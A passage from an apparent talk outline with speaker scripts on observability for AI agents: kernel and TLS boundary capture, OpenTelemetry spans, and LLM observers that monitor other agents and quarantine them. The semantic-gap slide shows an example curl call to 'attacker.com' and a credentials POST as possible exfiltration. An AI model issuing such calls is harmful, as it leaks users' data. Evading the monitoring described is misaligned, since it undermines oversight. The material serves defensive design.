often fails to beat Chain-of-Thought. Win-tie-lose ratios show mixed results. The caution is: don't assume MAD always justifies the extra cost. Scaling effects from ICLR show token growth can reach 7.5 times in specific regimes. This demands empirical cost-benefit analysis for each use case. It's not just 'more agents equals better'—it requires cost discipline. For observability, this means we must measure cost versus outcome: $/task versus success rate. Support A/B testing of CoT versus MAD versus hybrid approaches. Provide budget enforcement—stop if cost exceeds threshold. Enable post-hoc analysis: Was this multi-agent orchestration worth it?"

---

### 11) Formal: Two Gaps & Requirements Derivation (0:45)

The Two Fundamental Gaps (from your paper)

---

Gap 1: Instrumentation Gap 🔴
*Problem: Isolating the Causal Signal from High-Volume System Noise*

Technical Challenge:
Agent autonomy leads to unpredictable, high-volume system event streams:
1. Agents use any tool necessary to achieve goals → diverse system calls, file I/O, network traffic
2. High-volume noise: thousands of syscalls per task, most irrelevant to agent decisions
3. Causal signal buried: which events are intentional agent actions vs. background processes?
4. App-layer instrumentation adds coupling: framework-specific (LangChain, AutoGPT, custom)
5. Closed/managed components (Claude Code, Copilot) reject SDK injection entirely

Challenge:
- How to capture sufficient context without overwhelming signal-to-noise ratio?
- How to attribute system events to specific agent decisions amid concurrent processes?
- How to maintain capture across heterogeneous agent architectures?

→ Need stable capture boundaries that survive agent evolution and isolate causal signals

---

Gap 2: Semantic Gap 🟡
*Problem: Boundary telemetry shows WHAT, not WHY*

What Boundary Capture Provides:
- eBPF syscalls: `execve("curl", "https://attacker.com", ...)`
- TLS plaintext: `POST /api/credentials` with payload body
- Model API: Token counts, latency, completion text

What Boundary Capture Misses:
- Intent: Why did the agent choose this tool?
- Reasoning: What was the decision chain leading here?
- Goal alignment: Does this action serve the user's objective?
- Causal linkage: How does this syscall relate to prior model calls?

Example:
```
[Syscall] execve("curl", "https://attacker.com")
         ↑
         ❓ Is this legitimate API integration or data exfiltration?
         ❓ Which agent decision triggered this?
         ❓ What was the goal context?
```

---

Requirements Derived from Production Constraints

Context: Heterogeneity (multi-vendor) + Dynamism (rapid agent evolution) + Scale (1000s of agents)

---

R1: Decouple Capture from App Internals
*Addresses: Instrumentation Gap*

Design Principles:
- Capture at stable system boundaries that survive app changes:
  - Kernel/Syscall layer: Process lifecycle, file I/O (eBPF: Tetragon)
  - Network/TLS layer: Plaintext before encryption (uprobes: eCapture)
  - Model API layer: Request/response at SDK/HTTP boundary (OTel GenAI)
  - Human feedback layer: Structured evaluations and corrections

Invariance Properties:
- ✅ Survives agent code changes
- ✅ Survives framework migrations (LangChain → AutoGPT)
- ✅ Resistant to adversarial tampering (outside agent process)
- ✅ Works with closed/managed components (no code injection needed)

*Evidence: [Tetragon Process Execution](https://tetragon.io/docs/use-cases/process-lifecycle/process-execution/)*

---

R2: Autonomous Semantic Analysis at Scale
*Addresses: Semantic Gap*

Why LLM-Powered Observers:
- Reconstruction: Infer intent from raw events using domain knowledge
- Correlation: Link multi-layer evidence (syscall ← tool call ← reasoning ← goal)
- Adaptation: Handle new agent patterns without manual rule updates
- Scale: Process 1000s of trajectories/hour beyond human capacity

Cognitive Plane Capabilities:
1. Semantic evaluation: Detect hallucinations, loops, tool misuse
2. Trajectory reconstruction: Watson-style surrogate observers
3. Causal reasoning: Build decision → action → cost graphs
4. Policy enforcement: Budget caps, tool deny-lists, quarantine

*Evidence: [Watson arXiv:2411.03455](https://arxiv.org/abs/2411.03455)*

---

R3: Cross-Vendor Schema (Interoperability)
*Addresses: Fragmentation*

Standard: OpenTelemetry GenAI Semantic Conventions

Key Span Types:
- Agent spans: Goal, reasoning steps, tool invocations
- Model spans: Inference operations (tokens, latency, provider)
- Events: Discrete observations (tool calls, retrievals)
- Metrics: Aggregatable measurements (cost, token counts)

Benefits:
- ✅ Portable across backends (Langfuse, Phoenix, Datadog, Honeycomb)
- ✅ Multi-vendor correlation (agent in LangChain + model in OpenAI + tools in MCP)
- ✅ Ecosystem convergence (OpenInference, OpenLLMetry adopt OTel)

*Evidence: [OTel GenAI Agent Spans](https://opentelemetry.io/docs/specs/semconv/gen-ai/gen-ai-agent-spans/)*

---

R4: Privacy-Preserving Capture
*Addresses: Compliance & Trust*

Techniques:
1. Redaction at probe: Drop payloads, keep metadata
   - `open("/home/user/secrets.txt")` → `open("/home/user/*")`
2. Sampling: 1-10% full capture, 90-99% metadata-only
3. Scoped retention: 7d full traces, 90d aggregates, ∞ audit logs
4. Policy-driven filtering: Auto-delete PII-tagged spans after N days

Standards Integration:
- OTel attributes: `gen_ai.privacy.level = "masked" | "full" | "none"`
- MCP metadata: Tools declare data sensitivity levels

*Evidence: Privacy-by-design requirements from enterprise deployments*

---

Visual: Gap-to-Requirements Mapping

```
┌─────────────────────────┐
│  Production Challenges  │
└───────────┬─────────────┘
            │
    ┌───────┴───────┐
    │               │
┌───▼──────┐   ┌───▼──────┐
│   Gap 1  │   │   Gap 2  │
│Instrument│   │ Semantic │
└───┬──────┘   └───┬──────┘
    │              │
    ├──► R1: Boundary Capture (Tetragon, eCapture, OTel)
    ├──► R2: Cognitive Plane (Watson-style AI observers)
    │
    ▼
┌───────────────────┐
│  R3: Standards    │ (OTel GenAI spans)
│  R4: Privacy      │ (Redaction, sampling)
└───────────────────┘
```

Sources:
- Your paper (two gaps formalization)
- [Tetragon](https://tetragon.io/) (R1: boundary capture)
- [Watson arXiv](https://arxiv.org/abs/2411.03455) (R2: cognitive observers)
- [OTel GenAI](https://opentelemetry.io/docs/specs/semconv/gen-ai/gen-ai-agent-spans/) (R3: standard schema)

Speaker Script (0:45):
"Let me formalize the two gaps from our paper. The Instrumentation Gap: Isolating the causal signal from high-volume system noise. Agent autonomy means agents use any tool necessary to achieve goals, leading to unpredictable, high-volume system event streams—thousands of syscalls per task, most irrelevant to agent decisions. The causal signal is buried: which events are intentional agent actions versus background processes? App-layer instrumentation adds framework-specific coupling. Closed components like Claude Code and Copilot reject SDK injection entirely. The challenge: How to capture sufficient context without overwhelming signal-to-noise ratio? How to attribute system events to specific agent decisions amid concurrent processes? How to maintain capture across heterogeneous agent architectures? The Semantic Gap: Boundary telemetry—syscalls, TLS, network—shows what happened but not why. Raw events lack causal linkage between agent decisions, system actions, and outcomes. Example: we see an execve of curl to attacker-dot-com, but not why the agent chose this. From these gaps, we derive four requirements. R1: Decouple capture from app internals—capture at stable system boundaries: kernel syscalls, network TLS, model API, human feedback. Remain invariant despite agent code changes, framework switches, and evolving agent architectures. R2: Autonomous semantic analysis at scale—only LLM-powered observers in the Cognitive Plane can close the semantic gap, reconstructing decisions, correlating layers, adapting to new agent patterns, scaling beyond manual analysis. R3: Cross-vendor schema—adopt OTel GenAI agent spans for portable telemetry, enabling multi-vendor stacks to exchange and correlate observations. R4: Privacy-preserving capture—redaction and masking at probe time, dropping payloads but keeping metadata; sampling; scoped retention; policy-driven filtering."

---

### 12) Formal Definition: Agent Observability (0:45)

Formal System Model

An agentic system is a tuple ⟨G, Π, T, E⟩ where:
- G: Goals (user intent, objectives)
- Π: Plans/Trajectories (reasoning steps, decision sequences)
- T: Tools (external capabilities the agent can invoke)
- E: Environment Events (system actions, API calls, observations)

---

Definition: Agent Observability

Agent observability is the capability to:

(a) Capture:
- A minimal, sufficient statistic S(E) of environment events
- At stable system boundaries: model API / network (TLS) / syscalls / human feedback
- With properties: tamper-resistant, low overhead, privacy-preserving

(b) Infer:
- From the tuple ⟨S(E), G, Π, T⟩
- Whether the agent's reasoning and actions satisfy:
  - Correctness: Goal alignment, tool justification
  - Safety: Policy compliance, attack resistance
  - Cost: Budget constraints, efficiency
- With auditability: Traceable decision chains for compliance

---

Paradigm Shift from Traditional Observability

| Dimension | Traditional (Systems) | Agentic (Behavioral) |
|-----------|----------------------|---------------------|
| Primary Goal | System health & availability | Behavioral correctness, safety, trust |
| Pillars | MELT (Metrics, Events, Logs, Traces) | MELT + Evaluations + Governance |
| Unit of Analysis | Request trace (HTTP → service → DB) | Decision trajectory (goal → reasoning → tool → action → outcome) |
| Failure Modes | Exceptions (5xx, timeouts, crashes) | Quiet failures (logic errors, tool misuse, hallucinations, IPI) |
| Correlation | Distributed tracing (span hierarchy) | Causal reasoning (intent → action → system effect → cost) |
| Response | Alert → page ops team | Policy enforcement (quarantine, budget cap, tool deny-list) |

---

Formal Problem Decomposition (Three Pain Points)

1. Safety
   - Challenge: Uncertainty + complexity → semantic failures + adversarial threats
   - Examples: IPI, tool misuse, credential leakage
   - Requirement: Audit-quality trajectory traces with boundary-aligned capture

2. Cost
   - Challenge: Multi-layer, non-linear cost growth
   - Examples: Multi-agent token escalation (7.5×), infrastructure overhead (70% of API)
   - Requirement: $/task & tokens/solve SLIs, budget policies, cost attribution

3. Fragmentation
   - Challenge: Multi-vendor, multi-layer stacks with mixed ownership
   - Examples: SaaS models, managed agents (Claude Code), MCP tools
   - Requirement: Standard telemetry (OTel GenAI), boundary capture, cross-vendor correlation

---

Visual:

| Dimension | Traditional | → | Agentic |
|--------------|----------------|-------|-------------|
| Goal | System health | → | Behavioral correctness |
| Pillars | MELT | → | MELT + Evals + Gov |
| Unit | Request trace | → | Decision trajectory |
| Failures | Exceptions | → | Quiet failures |

*Sources:*
- Your paper (two-plane vision, gaps, requirements)
- [InjecAgent ACL 2024](https://aclanthology.org/2024.findings-acl.624/) (IPI threat model)
- [S²-MAD NAACL 2025](https://aclanthology.org/2025.naacl-long.475.pdf) (cost escalation)

Speaker Script (0:45):
"Having identified the gaps across the landscape, let me now formalize what Agent Observability means. An agentic system is a tuple of Goals, Plans, Tools, and Environment events. Agent observability is the capability to first, capture a minimal, tamper-resistant statistic at stable boundaries—model endpoints, network, syscalls, human feedback—and second, infer from these signals whether the agent's reasoning and actions satisfy correctness, safety, and cost constraints, with auditability. This shifts us from system health to behavioral correctness, from MELT to MELT plus Evaluations plus Governance, and from request traces to decision trajectories. The formal problem has three dimensions: safety under uncertainty, cost escalation, and fragmentation across vendors."

---

## Vision (3 slides) — from paper

### 13) Vision: Two-Plane Architecture (Overview) (1:00)

Data Plane:
- Capture cross-layer events at stable boundaries (model/network/TLS, system/process, human feedback)
- No in-app SDK required, suitable for closed-source/managed components
- Unify mapping to OTel GenAI agent/model spans
- Privacy-first: Redaction at probe time, sampling (1-10% full, 90-99% metadata), scoped retention
- *Source: [OTel GenAI](https://opentelemetry.io/docs/specs/semconv/gen-ai/)*

Cognitive Plane:
- Agents observe agents: semantic evals, trajectory reconstruction, cross-layer causality/cost correlation, policy & budget actions
- Scales beyond manual analysis

Why together:
- Data plane provides usable signals
- Cognitive plane provides interpretation & governance
- Together form safety/cost/control closed loop

Key Metrics:
- Security: Attack capture rate, Mean Time To Acknowledge (MTTA), trajectory completeness
- Cost: $/successful task, tokens/solve, runaway-loop prevention
- Reliability: Agent incident Mean Time To Resolve (MTTR), tool-success ratio, quiet failure detection
- Standards: OTel GenAI conformance, MCP tool coverage, cross-vendor correlation

Speaker Script (1:00):
"Our architecture has two inseparable planes. The Data Plane captures telemetry at stable boundaries—model endpoints, TLS traffic, system calls, and human feedback—without modifying application code. It maps events into OTel GenAI agent and model spans for vendor-neutral exchange. The Cognitive Plane uses agents that observe agents—surrogate AI observers perform semantic evaluations, reconstruct decision trajectories, reason about causes and costs across layers, and take policy actions like quarantine, budget caps, and alerts. Together they deliver the safety, cost, and control closed loop. The Data Plane provides usable signals; the Cognitive Plane provides interpretation and governance."

---

### 14) Vision: Data Plane (Evidence & Practice) (1:00)

System layer:
- Process/file/subprocess captured by Tetragon (eBPF tool)
- Captures: execve, lifecycle, file monitoring
- K8s/container metadata correlation
- *Source: [Tetragon Process Execution](https://tetragon.io/docs/use-cases/process-lifecycle/process-execution/)*

Network/TLS layer:
- Userspace library boundaries: uprobes (e.g., eCapture)
- Capture TLS plaintext
- Compatible with closed-source/managed clients & IDE integrations (no upstream code changes)
- *Source: [eCapture GitHub](https://github.com/gojue/ecapture)*

Model layer:
- OTel GenAI records inference operations (tokens, latency, provider attrs)
- Compatible with Langfuse/Phoenix/Datadog/Honeycomb backends
- *Source: [OTel GenAI Spans](https://opentelemetry.io/docs/specs/semconv/gen-ai/gen-ai-spans/)*

Human layer:
- Structured human feedback as ground truth
- Evaluation data feeds cognitive plane

Deployment Path (90 Days):
- P0 (Weeks 1-2): Boundary tracing (eBPF syscalls, TLS metadata, minimal model I/O spans)
- P1 (Weeks 3-4): Adopt OTel GenAI agent spans, bridge with OpenInference/OpenLLMetry
- P2 (Weeks 5-8): Deploy cognitive observability agents (Watson-style)
- P3 (Weeks 9-12): Multi-agent causal graphs, compliance/audit pipelines, MCP-aware capture

Speaker Script (1:00):
"Evidence this works today. At the system layer, Tetragon—an eBPF-based tool—observes process lifecycle: execve, file I/O, subprocess spawning. It correlates with Kubernetes and container metadata. At the network and TLS layer, eCapture demonstrates TLS plaintext capture at the library boundary—OpenSSL, GnuTLS—using uprobes, without changing application code. This is compatible with closed-source and managed clients and IDE integrations. At the model layer, OTel GenAI records inference operations: tokens, latency, provider attributes. These spans flow into backends like Langfuse, Phoenix, Datadog, Honeycomb. At the human layer, structured human feedback serves as ground truth for evaluation, feeding the Cognitive Plane."

---

### 15) Vision: Cognitive Plane (Algorithms & Outputs) (1:00)

Algorithms:
- Semantic evaluation: hallucination/loop/tool-misuse detection
- Decision trajectory reconstruction (ref: Watson)
- Multi-layer evidence causality graph
- Cost policies: $/task, tokens/solve
- *Source: [Watson arXiv](https://arxiv.org/abs/2411.03455)*

Outputs:
- ① Security alerts & isolation (policy enforcement)
- ② Cost budgets & rate limiting (fallback policies/shutdown conditions)
- ③ Auditable multi-agent causal chains & summaries

Privacy & Compliance Integration:
- Redaction/Masking: Drop payloads, keep metadata (e.g., `open("/home/user/*")`)
- Sampling: 1-10% full capture, 90-99% metadata-only
- Scoped retention: 7d full traces, 90d aggregates, ∞ audit logs
- Policy-driven filtering: Auto-delete PII-tagged spans after N days
- Standards: OTel `gen_ai.privacy.level` attributes, MCP policy metadata
- Consent & transparency: User notification, audit logs for compliance

Speaker Script (1:00):
"The Cognitive Plane runs algorithms for semantic evaluation: detecting hallucinations, infinite loops, tool misuse. Decision trajectory reconstruction, inspired by the Watson framework, uses surrogate observers to reconstruct reasoning without modifying the target agent runtime. It builds multi-layer causal graphs linking agent decisions to model token costs to system actions to outcomes. Cost policies enforce dollar-per-task limits and tokens-per-solve thresholds. Outputs include: first, security alerts and isolation—policy enforcement, quarantine, tool deny-lists; second, cost budgets and rate limiting—fallback policies, stop conditions, routing to cheaper agents; third, auditable multi-agent causal chains—structured summaries for regulatory review and incident post-mortems."

